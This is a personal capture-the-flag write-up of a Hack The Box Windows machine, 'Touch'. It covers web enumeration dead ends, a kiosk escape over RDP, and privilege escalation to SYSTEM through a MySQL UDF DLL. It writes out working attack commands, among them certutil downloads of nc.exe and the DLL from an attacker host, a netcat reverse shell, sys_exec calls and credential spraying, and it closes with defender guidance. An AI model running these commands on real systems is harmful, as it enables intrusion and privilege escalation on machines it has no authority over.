---
type: box
name: Touch
date: 2026-11-22
os: Windows
difficulty: Easy
status: done
hours: 0
hints: 0
confidence: medium
retired: false
published: false
tags:
  - htb
  - box
  - windows
---

## Target info

- **Name:** Touch
- **OS:** Windows
- **IP:** `10.129.3.184` (re-deployed again; earlier `10.129.3.146` → `10.129.3.170`. Session cookies reset on re-spawn; serial stays `<device-serial>`)
- **Goal:** User flag + Root flag
- **Carried-over intel (from Layover box):**
	- Name: `Jenny Crawford`
	- Booking confirmation code: `KS7X2M`
	- → likely a username / password / reset-token candidate here.

## Recon

- Full TCP port sweep: `nmap -p- --min-rate 5000 -oA touch_allports 10.129.3.146`
	- Only 4 ports open (65531 filtered):

| Port | Service | Version |
| ---- | ------- | ------- |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 3389/tcp | ms-wbt-server | RDP (Microsoft Terminal Service) |
| 5985/tcp | wsman | WinRM — Microsoft-HTTPAPI/2.0 (returns 404 on `/`) |
| 8443/tcp | https-alt | HTTP app — **Nexion DeviceHub - Login** (Microsoft-HTTPAPI/2.0) |

- Service/script scan: `nmap -sV -sC -p 135,3389,5985,8443 -oA touch_scripts 10.129.3.146`
	- 8443 is a custom web login (`http-title: Nexion DeviceHub - Login`, `/` → `/login`).
	- CORS enabled, methods: `GET POST PUT OPTIONS` → looks like a REST API behind the login.
	- Both 5985 and 8443 served by `Microsoft-HTTPAPI/2.0` → self-hosted app, not IIS.

**Read of the surface:**
- No SMB/LDAP/Kerberos → **not a domain controller**; standalone Windows host.
- The only real content is the **8443 web app** → that's the front door.
- **5985 (WinRM)** is the likely shell path once we have credentials (`evil-winrm`). 3389 (RDP) is a backup shell destination.
- Carried-over intel `Jenny Crawford` / `KS7X2M` → candidate login/username/token for the 8443 app.

## Enumeration

### 8443 is plaintext HTTP (not HTTPS)

- Despite nmap labelling it `https-alt`, TLS fails — the app speaks **plain HTTP on 8443**. Use `http://10.129.3.146:8443`.
- `whatweb -a3 http://10.129.3.146:8443` + `curl -sk -i http://10.129.3.146:8443/login`
	- `/` → 302 redirect to `/login`.
	- CORS wide open (`Access-Control-Allow-Origin: *`), accepts JSON (`Content-Type` allowed header).
	- App branding: **Nexion DocReader**, device **DeviceHub DH-100 — Gate B7**.

### Two auth paths on the login page

**Path 1 — device password** (`POST /login`):
- Single `password` field, no username.
- Hint on page: *"The default password is the device serial number included in your DeviceHub packaging."*
- → `KS7X2M` (6-char serial-like code) is the prime candidate here.

**Path 2 — staff badge** (`POST /login/badge`):
- Front-end JS: `fetch('/login/badge',{method:'POST'})` → expects JSON `{success, name, redirect}`.
- Returns a staff `name` and a `redirect` target on success → custom endpoint, likely accepts a name/badge-id in the body.
- → `Jenny Crawford` is the prime candidate here.

### Probe results

- `POST /login` with `password=KS7X2M` → **"Invalid password"**. So `KS7X2M` is NOT the device serial. (Wrong password renders a `.login-error` "Invalid password" div — useful oracle.)
- `POST /login/badge` with JSON `{"name":...}`, `{"badge":...}`, `{"code":...}` → all return `{"success":false,"error":"No badge detected"}`.
	- → none of those keys is the badge parameter. "No badge detected" = server didn't find a badge field; a correct key should change the error. This is the fuzzing oracle.
- `GET /css/style.css` → leaks the post-login dashboard layout: sidebar nav, device **info-table**, stat **cards**, a **log-box** (log viewer), and a **form with `<select>`**. Target features once inside: log viewer / DocReader → candidate for file read or injection.

### KEY: `/api` returns 403 (not 302)

- Content discovery (`-mc 200,401,403,500 -e .js,.json,...`) → only 3 non-302 hits:
	- `/login` → 200
	- `/favicon.svg` → 200 (just an icon)
	- **`/api` → 403, Size 35** ← distinct from everything else.
- Everything else 302-redirects to `/login`; `/api` actively **forbids**. → the API is gated by something *other* than the login session (token / API-key / header), not the cookie-redirect. **This is the new primary lead.**
- Badge param fuzz reran clean (0 errors) on both JSON body and query string → **zero hits**. Badge is not a body/query parameter → likely a request **header** (e.g. `X-Badge-Id`) or a decoy. Parked.

### `/api/status` is unauthenticated (200)

- `/api` and `/api/` → `403 {"error":"Authentication required"}` → API gated by auth, confirmed.
- API endpoint brute `/api/FUZZ` → **`/api/status` → 200, Size 116** (the only open one).
- → device status endpoint left unauthenticated; likely leaks the **device serial** = the `/login` password (per the login hint).
- `GET /api/status` body:

```json
{"device":"Nexion DeviceHub DH-100","serial":"<device-serial>","firmware":"1.4.2","status":"online","uptime":73875}
```

- **Device serial `<device-serial>` → use as the `/login` device password** (login-page hint: "default password is the device serial number").

### Fuzzing round 1 (lessons, no win yet)

- **App redirects ALL unknown/unauth paths → `/login` (302, Size 0).** So `-fc 404` is useless (there are no 404s). Lesson: on an app that 302s everything, **whitelist interesting codes** (`-mc 200,401,403,500`) instead of filtering 404. Only `/login`, `/css/style.css`, `/favicon.svg` return 200 unauth.
- Badge param fuzz (JSON body + form body, `burp-parameter-names.txt`, `-fr "No badge detected"`) → **no hits**, BUT ~20% requests errored at `-t 50` → inconclusive, rerun slower. Correct badge parameter may have been dropped.

## Foothold

### Logged into the DeviceHub dashboard

- `POST /login` with `password=<device-serial from /api/status>` → **302 → `/dashboard`**, sets `Set-Cookie: nxsession=<token>`.
- Authenticated `GET /dashboard` leaks a lot:

**Leaked credentials (hardcoded in dashboard HTML, unmasked by `toggleCred()`):**
- `KioskUser` / `<kiosk-password leaked in dashboard>` — reused for scanner + printer. → **try for WinRM (5985) cred reuse.**

**API map (from inline JS):**

| Endpoint | Method | Body |
| -------- | ------ | ---- |
| `/api/scanner/power`, `/api/printer/power` | POST | `{powered:bool}` |
| `/api/scan` | POST | — |
| `/api/scanner/settings`, `/api/printer/settings` | PUT | JSON settings |
| `/api/scanner/test-image` | **POST** | **raw file upload** |
| `/api/scanner/test-image` | DELETE | — |

**Other leads:**
- Pages: `/scanner /printer /logs /settings`.
- Footer links internal kiosk `http://localhost:5173`; "Service v4.2.1".
- Hardware serials: scanner `NX-SR-2024-0042`, printer `NX-TP-2024-0042`.

**Candidate foothold paths:**
1. Cred reuse `KioskUser:<pw>` over WinRM (5985) → possible direct shell + user flag. (fastest, try first)
2. `POST /api/scanner/test-image` raw file upload → arbitrary file write / webshell / doc-parser exploit → RCE.

### Scanner page = the upload/RCE surface

- `/scanner` "Document Image" card: *"Load a document image for the scanner to use during passport verification."*
	- `<input type=file accept="image/jpeg,image/png">` (client-side only) → `POST /api/scanner/test-image` with the **raw file as body** (not multipart, no filename).
	- MRZ Detection enabled; "Test Scan" (`POST /api/scan`) makes the scanner **process** the loaded image → doc/OCR/MRZ parser is the likely RCE sink.
- `/settings` confirms: serial `<device-serial>`, Auth Mode = "Password (device serial)", listen port 8443. No new creds.
- RCE routes to test: (a) file written to disk with controllable name/ext/path → webshell; (b) parser/command-injection when the uploaded image is processed.

### Upload happy path (valid image)

- Upload rejects <100 bytes (`"Image must be between 100 bytes and 10MB"`). Valid 120x120 JPEG (217B) → `200 {"success":true,"message":"Document image set","size":217,"hasMrz":false}`.
- Server **parses uploaded image for an MRZ** at upload (`hasMrz` flag) → attacker-controlled input hits a parser/OCR sink. Candidate RCE.
- Stored image served at **`/api/scanner/test-image/preview`** (`<img src>`); scanner page shows "Image loaded (N bytes)". → probe preview endpoint for **path traversal / LFI**.
- Two live targets now: (1) MRZ/scan processing of the uploaded image (`/api/scan`); (2) `/api/scanner/test-image/preview` file-serving → traversal.

### Scan + preview probes

- `POST /api/scan` → `{"documentDetected":true,"image":"/api/scan/last-capture",...}`. Processes loaded image into a "last capture"; no MRZ fields reflected (blank test image). MRZ parser still a candidate but needs a crafted MRZ image.
- `/api/scanner/test-image/preview` ignores `?file/path/name/...` params → just returns the stored JPEG. **No traversal/LFI here.**
- **Gap found:** original `/api/FUZZ` brute was *unauthenticated* (only `/api/status` open). Need to re-map API **with the session cookie** → likely printer/booking/print/system endpoints unseen.

### Authenticated API surface (with cookie)

- Top-level live: `/api/status` (200), `/api/logs` (200, 496B — new), `/api/scanner/test-image` (200), `/api/scan/last-capture` (503 until a scan runs).
- No `print`/`system`/`exec`/`firmware`/`booking` top-level endpoints (all 404). Actions live under `/api/scanner/*`, `/api/printer/*`, `/api/scan/*`.
- Next: read `/api/logs`; brute sub-trees `scanner/`, `printer/`, `scan/`.
- `/api/logs` = static activity array, no file paths/params → not an LFI vector.
- Sub-tree brute (raft-small) → **`/api/printer/queue` (200)** — NOT referenced in dashboard JS. Hidden print-queue endpoint → likely where booking (`Jenny Crawford`/`KS7X2M`) + boarding-pass rendering happen → command-injection candidate.
- `GET/POST /api/printer/queue` → `{"queue":[]}`. POST with many schemas (`name/document/template/file/passenger/boardingPass/...`) never grows queue → POST body ignored or queue only filled by scan flow. Parked.
- Plan pivot: blind **command-injection via OOB callback** across untested string inputs — `PUT /api/scanner/settings`, `PUT /api/printer/settings`, plus queue/scan fields.
- OOB volley (markers per field+syntax `& | ; "&`, callback to `http://<tun0>/`) + calibrate/scan triggers → **no callback** on listener. Settings return `{"success":true}` and don't execute input. Command-injection via settings/queue ruled out.
- → Commit to the MRZ/scan path (`hasMrz` processing of uploaded image).

### MRZ detection = validated parse (check digits)

- Tested 4 channels (rendered-text OCR, appended bytes, EXIF, JPEG comment) → all `hasMrz:false`. Not byte/metadata reading.
- Even a crisp, large, human-perfect MRZ strip → `hasMrz:false`. → server **validates** the MRZ (real parser, e.g. PassportEye); random check digits are rejected.
- Fix: generate a **mathematically valid TD3 MRZ** (weights 7/3/1, `<`=0/digit/letter A=10..Z=35; line-2 check digits for passport no, DOB, expiry, personal no, + composite). Render large & upload.
- Even a VALID MRZ (correct computed check digits) → still `hasMrz:false`. And `/api/scan` returns `documentDetected:true` on a blank image → scan doesn't need MRZ.
- **Confirmed it IS OCR**: local `tesseract --psm 6` reads line 2 perfectly but mangles the long `<` chevron runs on line 1 (`<`→`c`/`e`) because DejaVu's `<` is a math glyph. Server has the same OCR failure → MRZ invalid → `hasMrz:false`. Kerning/size tweaks didn't fix it.
- **Fix = render MRZ in the real passport font OCR-B** (unambiguous chevron glyph). Install `fonts-ocr-b` (Debian pkg), render with `/usr/share/fonts/opentype/ocr-b/*.otf`.
- Verified image with **PassportEye** (the standard MRZ lib, likely what the server uses): `valid_score 98`, surname `CRAWFORD`, names `JENNY`, all check digits valid. → **our MRZ is genuinely valid/readable.** Raw tesseract is a poor oracle (can't map `<`); PassportEye is the right one.
- BUT server upload still returns `hasMrz:false`, scan stays generic (`documentDetected:true` even on blank). → stop trusting the upload flag; check whether parsed passenger data flows into **last-capture image / logs / boarding pass** (the real injection target).

### MRZ is a DEAD END (flavor, not the vuln)

- Scanned a valid MRZ → `last-capture` is just our image re-served (converted to **grayscale** JPEG, 1817x241). Logs only say "Scan completed — document detected". **No `CRAWFORD`/`JENNY` anywhere** on the server → no booking lookup, no boarding-pass render, name flows nowhere. `KS7X2M` genuinely unused here.
- BUT the exit clue: **scan re-encodes our bytes (color→grayscale JPEG) via an image library** — the real attacker-controlled sink, and it's the same decode path that **crashed on garbage**. Pivot to fingerprinting that converter (ImageMagick vs GDI+/System.Drawing) via SVG → pick the RCE technique.
- SVG scan → returned **unchanged** (not rasterized) → converter only rasters raster formats = **GDI+/System.Drawing**-class (not ImageMagick). GDI+ crash = DoS, not easy RCE.
- **SVG XXE test** (external general + parameter entities → OOB listener, via upload/preview/scan) → **no callback** → SVG not XML-parsed server-side. XXE out.
- Next untested .NET RCE class: **unsafe JSON deserialization** (`$type`/Newtonsoft TypeNameHandling) on settings endpoints; also force a verbose error to leak library/paths/stack trace.
- Error probes → app uses **System.Text.Json** (manual `JsonElement.GetString()` parsing). `$type` ignored → no Newtonsoft/TypeNameHandling → **no deserialization RCE**. Errors terse (no stack trace/paths).

### Status check (what's left)

Eliminated: WinRM/SMB cred reuse, settings/queue cmd-injection, preview/last-capture traversal, logs LFI, MRZ (no data flow), SVG XXE, JSON deserialization, image-parser via SVG/ImageMagick.
Confirmed: admin app access; System.Text.Json; GDI+-class image decode that **crashes on malformed input** (DoS); self-hosted HttpListener.
Genuinely untested designed features: **the staff-badge login `/login/badge`** (never cracked "No badge detected" — only body/query params fuzzed, not headers) and the **GDI+ decoder crash** as a possible exploit.

### More dead ends (day 2)

- Hint creds as Windows logins: `nxc winrm` sprayed `jenny/jcrawford/jenny.crawford/...` : `KS7X2M` (and name-as-password, code-as-user) → all `[-]`. Not WinRM creds.
- Badge header fuzz was INVALID (POST w/o body → `HTTP 411 Length Required`); not a real test. Body/query param fuzz already negative.
- Upload **file-write / path traversal**: multipart upload IS parsed (stores inner content) but **filename ignored** (no `../css/pwn.css` write; 302). Content-Disposition on raw body ignored too. No arbitrary-write primitive.

### FOOTHOLD STILL OPEN — black-box web testing exhausted

Tested negative: auth bypass(got in via serial), cmd-injection(settings/queue), traversal(preview/last-capture/upload-filename), XXE, JSON deserialization, cred reuse(KioskUser + jenny*), MRZ(no data flow), file-write. App = self-hosted .NET HttpListener + System.Text.Json + GDI+-class decoder (crashes on bad input = DoS). Need the app source/binary or a new angle to find the planted vuln.

### *** THE REAL PATH: KIOSK ESCAPE via RDP (we were on the wrong interface) ***

(Found via research — "Touch" is an Easy Windows machine, Season 12. The whole web/MRZ/image rabbit hole was a distraction.)

- **8443 admin panel is the LEVER, not the RCE.** The box runs a locked-down **kiosk app** (`localhost:5173`, the "Return to Kiosk" link). You log into it over **RDP**.
- **KioskUser:<kiosk-pw>** (leaked in the dashboard) are **valid Windows creds for RDP** — confirmed by the earlier `evil-winrm` result `WinRMAuthorizationError` = creds valid, account just not allowed WinRM (NOT a bad password). I wrongly dismissed them.
- **Foothold chain (exact):**
	1. RDP in as `KioskUser` / `<kiosk-pw>` → locked airport kiosk app (passport scan / booking lookup).
	2. In the kiosk's **booking lookup**, use the carried-over clue **`Jenny Crawford` / `KS7X2M`** to advance to the scan step. (← this is where the hint is actually used.)
	3. From Kali browser on the 8443 admin panel, **power the device OFF mid-scan** → kiosk throws an **error with a link that opens Edge**.
	4. In Edge: **Ctrl+O** → native file picker → type `C:\Windows\System32\cmd.exe` in the filename bar → launches **cmd.exe** (classic LOLBin file-picker kiosk breakout).
	5. RDP clipboard broken → host `nc.exe` over HTTP, pull with `certutil -urlcache -split -f http://<ATTACKER>:<port>/nc.exe n.exe && n.exe` → reverse shell. → **user.txt** at `C:\Users\KioskUser\Desktop\`.

### Privilege escalation → SYSTEM (MySQL UDF)

- Two vendor app dirs in `Program Files`: Node/TS kiosk app + .NET "DocReader" backend. Kiosk app `database/index.ts` has a hardcoded fallback MySQL conn string (`kiosk_app` user); MySQL bound to `127.0.0.1:3306` only.
- World-readable scheduled-task script **`C:\ProgramData\HTB Airways\refresh-dates.bat`** → MySQL **root** creds (`root` / `<root-db-pw>`).
- Root has FILE + SUPER, BUT **`secure_file_priv = NULL`** blocks `INTO OUTFILE` / UDF-via-SQL file writes.
- **Key insight:** `secure_file_priv` only restricts MySQL's *own* SQL file functions — NOT a file dropped to disk via an OS shell. And **`plugin_dir` is writable by Authenticated Users (Modify)**.
- So: drop a precompiled **`lib_mysqludf_sys.dll`** (Metasploit) into `plugin_dir` via `certutil` → `CREATE FUNCTION sys_exec` → run `n.exe` → reverse shell as **SYSTEM**. → **root.txt**.
- Recon gap: authenticated top-level `/api` brute output was buried under progress spam (only `logs`/`status` hand-confirmed). **Booking code `KS7X2M` still unused** → re-brute `/api` cleanly to JSON to find booking/passenger/verify/checkin endpoints.

### Complete authenticated API map

- Top-level: `GET /api/status`, `GET /api/logs`, **`GET /api/scanner` (421B)**, **`GET /api/printer` (311B)**, `POST /api/scan` (GET→405).
- **No booking/passenger/verify/checkin endpoint exists** → `KS7X2M` not used in this 8443 API (belongs to kiosk `localhost:5173`, or red herring). Stop hunting it here.
- Sub-resources: `scanner/{test-image, test-image/preview, settings, power, calibrate}`, `printer/{settings, power, queue}`, `scan/last-capture`.
- Next: read `GET /api/scanner` + `GET /api/printer` (unseen) for file paths / firmware / hidden fields; then focus on the **image-upload decoder** as the main attacker-controlled sink.
- `GET /api/scanner` / `GET /api/printer` = status JSON only (re-leak `KioskUser:<kiosk-pw>`, firmware version strings; no file paths, no update endpoint).

### Upload decoder = main sink

- Format probe: png/gif/bmp/tiff/svg **and 200 bytes of pure garbage** all → `success:true`. Upload does NOT decode/validate — stores raw bytes (size check only).
- → decode/processing happens later, at **preview** or **scan**. That's where the imaging library runs on our bytes → target. Next: feed garbage, read the error/exception to fingerprint the library (ImageMagick/GDI+/SkiaSharp/ImageSharp).
- **Feeding garbage to preview/scan CRASHED the service** (8443 dead, box still pings). → preview/scan DO decode stored bytes, and the decode path has **no exception handling** (unhandled crash). Fragile native-ish decoder = the real target, but must send *crafted* inputs, not random garbage (random = DoS only). Service restart clears sessions → re-login needed after recovery.


### Dead end: WinRM cred reuse

- `evil-winrm -i 10.129.3.146 -u KioskUser -p '<pw>'` → connects, but `whoami` → `WinRM::WinRMAuthorizationError`.
- → `KioskUser` is not authorized for WinRM (not a real Windows account, or not in *Remote Management Users*). Keep creds for later; pivot to the upload path.
- `nxc winrm` → `[-] KIOSK-042\KioskUser:<kiosk-pw>` = **invalid Windows cred** (UI-only device string, red herring).
- Host facts from nxc: **`KIOSK-042`**, Windows 11 / Server 2025 Build 26100, standalone (no AD).

## Privilege escalation → SYSTEM (MySQL UDF `sys_exec`)

**Executed live. This is what actually worked (with the snags I hit).**

### 1. Find the MySQL root credential
- `C:\ProgramData\HTB Airways\` holds `refresh-dates.bat`, `db-config.ini`, `refresh-dates.sql`, `db-sync-replica.ps1`.
- **Gotcha:** typing `refresh-dates.bat` *runs* it — use `type refresh-dates.bat` to read it.
- `refresh-dates.bat` contains the root login + binary path:
	- `C:\MySQL\bin\mysql.exe -u root -p<root-db-pw> < refresh-dates.sql`
- So: MySQL root creds + `mysql.exe` at `C:\MySQL\bin\`.

### 2. Recon MySQL (why UDF, not INTO OUTFILE)
```
mysql.exe -u root -p"<root-db-pw>" -e "SELECT current_user(); SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'plugin_dir';"
```
- `current_user()` = `root@localhost` (full privs incl. FILE + SUPER).
- **`secure_file_priv = NULL`** → blocks `LOAD_FILE` / `INTO OUTFILE` / `INTO DUMPFILE` → the *classic* UDF-drop-via-SQL is dead.
- `plugin_dir = C:\MySQL\lib\plugin\`.
- **Key insight:** `secure_file_priv` only gates MySQL's *own* SQL file functions. It has zero effect on a file written to `plugin_dir` by the **OS shell**. And that dir is writable by `Authenticated Users` (incl. KioskUser) → drop the DLL with `certutil`, not SQL.

### 3. Drop the UDF DLL into plugin_dir
- Metasploit ships a precompiled 64-bit UDF: `/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll` (7168 bytes). Serve it over HTTP from Kali.
- **Gotcha #1:** `certutil ... <url>` *without* an output path saves the file into the **current directory**, not where you think — the first pull "succeeded" (HTTP 200 in the server log) but the DLL never reached the plugin dir → `CREATE FUNCTION` failed with `ERROR 1126 (errno 126: specified module could not be found)`. A 200 in the server log means *downloaded*, not *landed where intended*. Always pass the explicit destination and verify with `dir`.
- Correct pull (run it *from* the plugin dir, or give the full dest path):
```
certutil -urlcache -split -f http://<ATTACKER>:6666/lib_mysqludf_sys_64.dll lib_mysqludf_sys_64.dll
dir lib_mysqludf_sys_64.dll   # confirm 7168 bytes, MZ/PE header via `type`
```

### 4. Create the function and execute as SYSTEM
```
mysql.exe -u root -p"<root-db-pw>" -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys_64.dll'"
```
- (If it says `ERROR 1125 Function 'sys_exec' already exists`, it's registered — carry on.)
- **Gotcha #2 — backslash escaping:** inside a MySQL string literal, `\n` = newline, `\t` = tab, etc. A Windows path like `...\Desktop\n.exe` gets mangled (`\n` → newline). **Double every backslash:** `C:\\Users\\KioskUser\\Desktop\\n.exe`.
- **Gotcha #3 — SYSTEM-owned output ACL:** `sys_exec('cmd /c whoami > C:\\Windows\\Temp\\w.txt')` runs fine and returns `0`, but the file is created by SYSTEM with an ACL KioskUser can't read → `type` gives `Access is denied`. That denial is itself *proof* the command ran as SYSTEM. Write output into your own profile instead (inherits KioskUser read): `C:\\Users\\KioskUser\\...`.

**Flag grab (no reverse shell needed — most reliable given flaky RDP paste):**
```
mysql.exe -u root -p"<root-db-pw>" -e "SELECT sys_exec('cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\KioskUser\\r.txt')"
type C:\Users\KioskUser\r.txt
```
**Proper SYSTEM shell (alternative):** host `nc.exe`, `nc -lvnp 8888` on Kali, then
`SELECT sys_exec('C:\\Users\\KioskUser\\Desktop\\n.exe <ATTACKER> 8888 -e cmd.exe')` → shell as `NT AUTHORITY\SYSTEM`.

## Flags

- [x] User flag — `C:\Users\KioskUser\Desktop\user.txt` (read directly after the cmd.exe breakout)
- [x] Root flag — `C:\Users\Administrator\Desktop\root.txt` (via `sys_exec` as SYSTEM)

## What failed / dead ends

The entire **web/image/MRZ rabbit hole** was flavor, not the vuln. Confirmed negative:
- WinRM/SMB cred reuse (`KioskUser`, `jenny*`) — `WinRMAuthorizationError` ≠ invalid; it means **valid creds, not WinRM-authorized** (they're the RDP login). **I wrongly dismissed KioskUser as invalid — the single biggest time sink.**
- Cmd-injection via `/api/*/settings` + `/api/printer/queue` (OOB callback) — settings don't execute input.
- Path traversal / LFI — `test-image/preview`, `scan/last-capture`, `/api/logs`, upload filename — all ignore path params.
- SVG XXE — SVG not XML-parsed server-side.
- JSON deserialization — app uses `System.Text.Json` (manual parse), no `TypeNameHandling`.
- MRZ parsing — built a check-digit-valid TD3 MRZ in OCR-B (PassportEye score 98), but server never flips `hasMrz` and the name flows nowhere. `KS7X2M` is **not** used in the 8443 API at all — it's for the *kiosk* booking lookup over RDP.
- Garbage upload → crashed the GDI+-class decoder (DoS only, no exception handling), killed 8443, forced a lab restart.

## What I'd do differently

- **Treat a leaked UI credential as a real login until proven otherwise.** `WinRMAuthorizationError` = valid+unauthorized → immediately try **RDP** (3389) and SMB, don't write the cred off.
- When a box leaks RDP + a "kiosk"/`localhost:5173` reference, suspect a **kiosk-escape** path early instead of grinding the web app for RCE. The web panel was the *lever* (power-off trigger), not the target.
- `certutil` pulls: always pass the explicit destination path and `dir`-verify size; an HTTP-server 200 only proves download.
- Keep a `sys_exec('cmd /c ... > %OWN_PROFILE%\\out.txt')` pattern ready — avoids RDP clipboard/paste pain and SYSTEM-ACL read-back issues.

## Defender's view (detection and fix)

- **Don't leak the device serial** from an unauth endpoint (`/api/status`) when the serial *is* the admin password. Decouple secrets from device identifiers.
- **Kiosk hardening:** block child-process launches from the kiosk browser; disable `Ctrl+O`/file dialogs; run the shell under a Software Restriction / AppLocker policy that denies `cmd.exe`, `powershell.exe`, file pickers. The Edge-error → file-picker → `cmd.exe` chain is the core break.
- **MySQL:** run the service as a low-privilege account (not SYSTEM); set `plugin_dir` ACL so non-admins can't write (removes the UDF drop); don't store the root password in a world-readable `C:\ProgramData\...\*.bat`.
- **Telemetry:** alert on `certutil -urlcache` downloads, new DLLs in `plugin_dir`, and `CREATE FUNCTION ... SONAME`, and on `mysqld.exe` spawning `cmd.exe`/`nc.exe`.

## Commands I actually ran

> Placeholders: `<TARGET>` target IP, `<ATTACKER>` tun0 IP, `<device-serial>` 8443 password (from `/api/status`), `<kiosk-pw>` KioskUser RDP password, `<root-db-pw>` MySQL root password (from `refresh-dates.bat`). No flags/passwords committed.

```bash
# --- recon ---
nmap -p- --min-rate 5000 -oA touch_allports <TARGET>
nmap -sV -sC -p 135,3389,5985,8443 -oA touch_scripts <TARGET>

# --- 8443 enum (plain HTTP despite "https-alt") ---
whatweb -a3 http://<TARGET>:8443
ffuf -u http://<TARGET>:8443/api/FUZZ -w common-api.txt -mc 200,401,403,500 -o api.json -of json
curl -s http://<TARGET>:8443/api/status          # leaks <device-serial>
curl -s -c cj.txt -d "password=<device-serial>" http://<TARGET>:8443/login   # -> /dashboard, nxsession cookie
curl -s -b cj.txt http://<TARGET>:8443/dashboard  # leaks KioskUser / <kiosk-pw>

# --- foothold: kiosk escape over RDP ---
xfreerdp /v:<TARGET> /u:KioskUser /p:'<kiosk-pw>' /cert:ignore +clipboard /dynamic-resolution
#  in kiosk: booking lookup  ref=KS7X2M  lastname=Crawford  -> passport scan
#  Kali browser on 8443 -> power device OFF mid-scan -> DocReader error link -> opens Edge
#  Edge: Ctrl+O -> filename bar -> C:\Windows\System32\cmd.exe -> cmd.exe
#  (Windows) read user flag:
type C:\Users\KioskUser\Desktop\user.txt

# --- stage tooling on Kali ---
cp /usr/share/windows-resources/binaries/nc.exe /tmp/
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll /tmp/
cd /tmp && python3 -m http.server 6666

# --- privesc: MySQL UDF -> SYSTEM (run on Windows) ---
type "C:\ProgramData\HTB Airways\refresh-dates.bat"          # -> root:<root-db-pw>
mysql.exe -u root -p"<root-db-pw>" -e "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'plugin_dir';"
cd C:\MySQL\lib\plugin
certutil -urlcache -split -f http://<ATTACKER>:6666/lib_mysqludf_sys_64.dll lib_mysqludf_sys_64.dll
dir lib_mysqludf_sys_64.dll
mysql.exe -u root -p"<root-db-pw>" -e "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys_64.dll'"
mysql.exe -u root -p"<root-db-pw>" -e "SELECT sys_exec('cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\KioskUser\\r.txt')"
type C:\Users\KioskUser\r.txt
# optional SYSTEM shell:  nc -lvnp 8888  (Kali) then
# mysql.exe -u root -p"<root-db-pw>" -e "SELECT sys_exec('C:\\Users\\KioskUser\\Desktop\\n.exe <ATTACKER> 8888 -e cmd.exe')"
```

## Notes to self

- **A leaked credential is a login until disproven.** `WinRMAuthorizationError` = valid creds, wrong service → try RDP/SMB next, don't bin them.
- Web app can be the **lever**, not the target. "Kiosk" + RDP + `localhost:5173` → think **kiosk escape** (Edge `Ctrl+O` → `cmd.exe`) before hunting web RCE.
- `secure_file_priv=NULL` kills SQL-based file writes but **not** an OS-shell DLL drop into a writable `plugin_dir` → MySQL UDF privesc still viable. Check `plugin_dir` ACL with `icacls`.
- MySQL string literals eat `\n`, `\t`, etc. → **double all backslashes** in Windows paths inside SQL.
- `sys_exec` output you can't read (`Access is denied`) = it ran as **SYSTEM**; redirect into your own profile dir to read it back.
- `certutil` HTTP-server 200 ≠ file landed — always give the explicit dest path and `dir`-verify.
- RDP paste duplicates/merges lines → run one command at a time, hit **Esc** to clear the input line before typing the next.
